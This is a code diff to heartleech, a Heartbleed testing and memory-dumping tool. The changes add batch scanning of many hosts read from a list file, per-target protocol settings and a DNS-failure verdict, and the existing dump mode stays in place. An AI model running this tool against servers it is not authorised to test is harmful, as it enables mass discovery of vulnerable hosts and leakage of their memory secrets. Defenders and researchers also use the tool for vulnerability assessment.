@@ -100,6 +100,7 @@ int ssl3_write_bytes(SSL *s, int type, const void *buf_, int len);
  * the scan
  */
 int is_debug = 0;
+int is_scan = 0;
 
 /**
  * The "scan-result" verdict, whether the system is vulnerable, safe, or
@@ -112,6 +113,7 @@ enum {
     Verdict_Inconclusive,
     Verdict_Inconclusive_NoTcp,
     Verdict_Inconclusive_NoSsl,
+    Verdict_Inconclusive_NoDNS,
 };
 
 /**
@@ -208,6 +210,15 @@ struct Target {
         unsigned done;
     } loop;
     int scan_result;
+    char *http_request;
+    unsigned starttls;
+    unsigned application;
+};
+
+struct TargetList {
+    size_t count;
+    size_t max;
+    struct Target *list;
 };
 
 /**
@@ -230,10 +241,6 @@ struct DumpArgs {
     enum Operation op;
     unsigned is_scan:1;
     FILE *fp;
-    struct Target target;
-    unsigned application;
-    unsigned is_starttls;
-    unsigned starttls;
     char *cert_filename;
     char *dump_filename;
     char *offline_filename;
@@ -249,9 +256,8 @@ struct DumpArgs {
         char *host;
         unsigned port;
     } proxy;
-    struct {
-        char *http_request;
-    } proto;
+    struct TargetList targets;
+    unsigned default_port;
 };
 
 /******************************************************************************
@@ -259,6 +265,8 @@ struct DumpArgs {
 int ERROR_MSG(const char *fmt, ...)
 {
     va_list marker;
+    if (is_scan && !is_debug)
+        return -1;
     va_start(marker, fmt);
     vfprintf(stderr, fmt, marker);
     va_end(marker);
@@ -269,7 +277,7 @@ int DEBUG_MSG(const char *fmt, ...)
 {
     va_list marker;
     if (!is_debug)
-        return 0;
+        return -1;
     va_start(marker, fmt);
     vfprintf(stderr, fmt, marker);
     va_end(marker);
@@ -365,10 +373,7 @@ receive_heartbeat(int write_p, int version, int content_type,
             "aaaaaaaaaaaaaaaa"
             ;
         if (memcmp(buf, good_response, 48+3) == 0) {
-            if (!args->is_scan)
-                ERROR_MSG("[-] PATCHED: heartBEAT received, but not BLEED\n");
-            else
-                DEBUG_MSG("[-] PATCHED: heartBEAT received, but not BLEED\n");
+            ERROR_MSG("[-] PATCHED: heartBEAT received, but not BLEED\n");
             connection->heartbleeds.failed++;
             target->scan_result = Verdict_Safe;
             return;
@@ -1011,8 +1016,6 @@ starttls_smtp(int fd,
 {
     unsigned char line[2048];
     unsigned offset;
-    char proxy_address[300] = "";
-    unsigned proxy_port = 0;
     int x;
 
 
@@ -1086,8 +1089,6 @@ starttls_ftp(int fd,
 {
     unsigned char line[2048];
     unsigned offset;
-    char proxy_address[300] = "";
-    unsigned proxy_port = 0;
     int x;
 
 
@@ -1160,8 +1161,6 @@ starttls_imap4(int fd,
 {
     unsigned char line[2048];
     unsigned offset;
-    char proxy_address[300] = "";
-    unsigned proxy_port = 0;
     int x;
 
 
@@ -1205,8 +1204,6 @@ starttls_pop3(int fd,
 {
     unsigned char line[2048];
     unsigned offset;
-    char proxy_address[300] = "";
-    unsigned proxy_port = 0;
     int x;
 
 
@@ -1299,6 +1296,7 @@ ssl_thread(const struct DumpArgs *args, struct Target *target)
     DEBUG_MSG("\n[ ] resolving \"%s\"\n", hostname);
     x =  getaddrinfo(hostname, port, 0, &addr);
     if (x != 0) {
+        target->scan_result = Verdict_Inconclusive_NoDNS;
         return ERROR_MSG("[-] %s: DNS lookup failed\n", hostname);
     } else if (is_debug) {
         struct addrinfo *a;
@@ -1329,10 +1327,10 @@ ssl_thread(const struct DumpArgs *args, struct Target *target)
      * Do a normal TCP connect to the target IP address, sending a SYN and
      * so on
      */
-    target->scan_result = Verdict_Inconclusive_NoTcp;
     DEBUG_MSG("[ ] %s: connecting...\n", address);
     x = connect(fd, addr->ai_addr, (int)addr->ai_addrlen);
     if (x != 0) {
+        target->scan_result = Verdict_Inconclusive_NoTcp;
         ERROR_MSG("[-] %s: connect failed: %s (%u)\n", 
             address, error_msg(WSAGetLastError()), WSAGetLastError());
         if (target->loop.done == 0)
@@ -1359,8 +1357,7 @@ ssl_thread(const struct DumpArgs *args, struct Target *target)
     /*
      * If doing STARTTLS, do the negotiation now.
      */
-    if (args->is_starttls)
-    switch (args->starttls) {
+    switch (target->starttls) {
     case APP_NONE:
         break;
     case APP_SMTP:
@@ -1510,10 +1507,7 @@ ssl_thread(const struct DumpArgs *args, struct Target *target)
      * If heartbeats are disabled, then early exit
      */
     if (ssl->tlsext_heartbeat != 1) {
-        if (!args->is_scan)
-            ERROR_MSG("[-] target doesn't support heartbeats\n");
-        else
-            DEBUG_MSG("[-] target doesn't support heartbeats\n");
+        ERROR_MSG("[-] target doesn't support heartbeats\n");
         connection->heartbleeds.failed++;
     }
 
@@ -1563,12 +1557,12 @@ again:
      *  layer, or it could be a an application layer request, such as an
      *  HTTP GET or SMTP NOOP command.
      */
-    switch (args->application) {
+    switch (target->application) {
     case APP_HTTP:
         ssl3_write_bytes(ssl, 
                          SSL3_RT_APPLICATION_DATA, 
-                         args->proto.http_request, 
-                         (int)strlen(args->proto.http_request));
+                         target->http_request, 
+                         (int)strlen(target->http_request));
         break;
     case APP_SMTP:
         ssl3_write_bytes(ssl, 
@@ -1837,8 +1831,8 @@ EQUALS(const char *lhs, const char *rhs)
 
 /******************************************************************************
  ******************************************************************************/
-static void
-initialize_protocols(struct DumpArgs *args, const struct Target *target)
+static char *
+initialize_http(const struct Target *target)
 {
     /*
      * Format the HTTP request. We need to stick the "Host:" header in
@@ -1862,9 +1856,41 @@ initialize_protocols(struct DumpArgs *args, const struct Target *target)
     memcpy(request + prefix + hostname_length, 
            prototype + prefix, 
            strlen(prototype+prefix) + 1);
-    args->proto.http_request = request;
+    return request;
 }
 
+
+/******************************************************************************
+ * Add a target to our list, when scanning multiple targets
+ ******************************************************************************/
+static void
+add_target(struct TargetList *targets, const char *hostname)
+{
+    struct Target *target;
+    
+    /* Expand the list to accomodate the new target */
+    if (targets->count + 1 >= targets->max) {
+        size_t new_max = targets->max * 2 + 1;
+        if (targets->list) {
+            targets->list = (struct Target*)realloc(
+                                        targets->list, 
+                                        new_max * sizeof(targets->list[0]));
+        } else {
+            targets->list = (struct Target*)malloc(
+                                        new_max * sizeof(targets->list[0]));
+            
+        }
+        targets->max = new_max;
+    }
+    
+    /* add the target */
+    target = &targets->list[targets->count++];
+    memset(target, 0, sizeof(*target));
+    
+    target->port = 0x10000;
+    target->hostname = (char*)malloc(strlen(hostname)+1);
+    memcpy(target->hostname, hostname, strlen(hostname)+1);
+}
 
 /******************************************************************************
  * Called by the configuration-reading function for processing options
@@ -1926,7 +1952,7 @@ heartleech_set_parameter(struct DumpArgs *args,
             fprintf(stderr, "loop: bad value: %s\n", value);
             exit(1);
         } else {
-            args->target.port = strtoul(value, 0, 0);
+            args->default_port = strtoul(value, 0, 0);
         }
         return 1;
     } else if (EQUALS("proxy", name)) {
@@ -1978,15 +2004,34 @@ heartleech_set_parameter(struct DumpArgs *args,
     } else if (EQUALS("scan", name)) {
         args->op = Op_Scan;
         args->is_scan = 1;
+        is_scan = 1;
         return 0; /* no 'value' argument */
-    } else if (EQUALS("target", name)) {
-        if (args->target.hostname) {
-            fprintf(stderr, "[-] target already specified: %s\n", 
-                    args->target.hostname);
-            free(args->target.hostname);
+    } else if (EQUALS("scanlist", name)) {
+        FILE *fp;
+        heartleech_set_parameter(args, "scan", "true");
+        fp = fopen(value, "rt");
+        if (fp == NULL) {
+            perror(value);
+            exit(1);
         }
-        args->target.hostname = (char*)malloc(strlen(value)+1);
-        memcpy(args->target.hostname, value, strlen(value)+1);
+        for (;;) {
+            char line[512];
+            if (fgets(line, sizeof(line), fp) == 0)
+                break;
+            while (line[0] && isspace(line[strlen(line)-1] & 0xFF))
+                line[strlen(line)-1] = '\0';
+            while (line[0] && isspace(line[0]&0xFF))
+                memmove(line, line+1, strlen(line));
+            if (line[0] == '#' || line[0] == ';' || line[0] == '/')
+                continue;
+            if (line[0] == '\0')
+                continue;
+            heartleech_set_parameter(args, "target", line);
+        }
+        fclose(fp);
+        return 1;
+    } else if (EQUALS("target", name)) {
+        add_target(&args->targets, value);
         if (args->op == 0)
             args->op = Op_Dump;
         return 1;
@@ -2037,13 +2082,8 @@ read_configuration(struct DumpArgs *args, int argc, char *argv[])
          * on the commandline -- when scanning many targets, they must come
          * from a file. */
         if (argv[i][0] != '-') {
-            if (args->target.hostname == NULL) {
-                heartleech_set_parameter(args, "target", argv[i]);
-                continue;
-            } else {
-                fprintf(stderr, "[-] %s: unknown option\n", argv[i]);
-                exit(1);
-            }
+            heartleech_set_parameter(args, "target", argv[i]);
+            continue;
         }
         
         /* 
@@ -2087,19 +2127,93 @@ read_configuration(struct DumpArgs *args, int argc, char *argv[])
 
 
 /******************************************************************************
+ * Scan a list of targets
+ ******************************************************************************/
+static void
+run_scan(const struct DumpArgs *args, size_t start, size_t stop)
+{
+    size_t i;
+    
+    
+    for (i=start; i<stop; i++) {
+        struct Target target;
+        unsigned is_starttls = 0;
+
+        target = args->targets.list[i];
+        
+        target.loop.desired = args->cfg_loopcount;
+        
+        if (target.port > 65535)
+            target.port = args->default_port;
+        
+        target.application = port_to_app(target.port, &is_starttls);
+        if (is_starttls)
+            target.starttls = target.application;
+        
+        if (target.application == APP_HTTP)
+            target.http_request = initialize_http(&target);
+        
+        /*
+         * Now run the thread
+         */
+        while (target.loop.done < target.loop.desired) {
+            int x;
+            x = ssl_thread(args, &target);
+            if (x < 0)
+                break;
+        }
+        
+        /*
+         * Print verdict, if doing a scan
+         */
+        if (args->is_scan) {
+            switch (target.scan_result) {
+                case Verdict_Safe:
+                    printf("%s:%u: SAFE\n", 
+                           target.hostname, target.port);
+                    break;
+                case Verdict_Vulnerable:
+                    printf("%s:%u: VULNERABLE\n", 
+                           target.hostname, target.port);
+                    break;
+                case Verdict_Inconclusive_NoDNS:
+                    printf("%s:%u: INCONCLUSIVE: DNS failed\n", 
+                           target.hostname, target.port);
+                    break;
+                case Verdict_Inconclusive_NoTcp:
+                    printf("%s:%u: INCONCLUSIVE: TCP connect failed\n", 
+                           target.hostname, target.port);
+                    break;
+                case Verdict_Inconclusive_NoSsl:
+                    printf("%s:%u: INCONCLUSIVE: SSL handshake failed\n", 
+                           target.hostname, target.port);
+                    break;
+                default:
+                    printf("%s:%u: INCONCLUSIVE\n", 
+                           target.hostname, target.port);
+                    break;
+            }
+        }
+        
+        if (target.http_request)
+            free(target.http_request);
+    }    
+}
+
+
+/******************************************************************************
  ******************************************************************************/
 int
 main(int argc, char *argv[])
 {
     struct DumpArgs args;
-    struct Target *target = &args.target;
 
     memset(&args, 0, sizeof(args));
-    args.target.port = 443;
+    args.default_port = 443;
     args.cfg_loopcount = 1000000;
     args.timeout = 6;
 
-    fprintf(stderr, "\n--- heartleech/1.0.0d ---\n");
+    fprintf(stderr, "\n--- heartleech/1.0.0e ---\n");
     fprintf(stderr, "from https://github.com/robertdavidgraham/heartleech\n");
 
     /*
@@ -2177,47 +2291,11 @@ main(int argc, char *argv[])
             
         case Op_Dump:
         case Op_Scan:
-            if (args.target.hostname == 0) {
+            if (args.targets.count == 0) {
                 ERROR_MSG("[-] most specify target host\n");
                 exit(1);
             }
-            args.target.loop.desired = args.cfg_loopcount;
-
-            args.application = port_to_app(args.target.port, &args.is_starttls);
-            if (args.is_starttls)
-                args.starttls = args.application;
-            initialize_protocols(&args, &args.target);
-
-            
-            /*
-             * Now run the thread
-             */
-            while (args.target.loop.done < args.target.loop.desired) {
-                int x;
-                x = ssl_thread(&args, &args.target);
-                if (x < 0)
-                    break;
-            }
-            
-            /*
-             * Print verdict, if doing a scan
-             */
-            if (args.is_scan) {
-                switch (target->scan_result) {
-                    case Verdict_Safe:
-                        printf("%s:%u: SAFE\n", 
-                               target->hostname, target->port);
-                        break;
-                    case Verdict_Vulnerable:
-                        printf("%s:%u: VULNERABLE\n", 
-                               target->hostname, target->port);
-                        break;
-                    default:
-                        printf("%s:%u: INCONCLUSIVE\n", 
-                               target->hostname, target->port);
-                        break;
-                }
-            }
+            run_scan(&args, 0, args.targets.count);
             return 0;
             
         case Op_Offline:
